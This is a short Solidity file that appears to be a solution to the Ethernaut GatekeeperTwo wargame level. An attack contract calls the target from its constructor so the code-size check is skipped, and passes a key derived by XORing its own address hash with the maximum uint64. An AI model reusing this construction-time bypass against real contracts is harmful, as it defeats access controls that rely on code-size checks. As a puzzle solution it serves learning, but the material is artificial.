//SPDX-License-Identifier
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateKeeperTwoAttack {
    constructor() {
        IGatekeeperTwo gatekeeperTwoContract = IGatekeeperTwo(
            0x9Df2F2c89a80E79C757f406a07b87F892ae229E0
        );

        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                (type(uint64).max)
        );

        gatekeeperTwoContract.enter(key);
    }
}
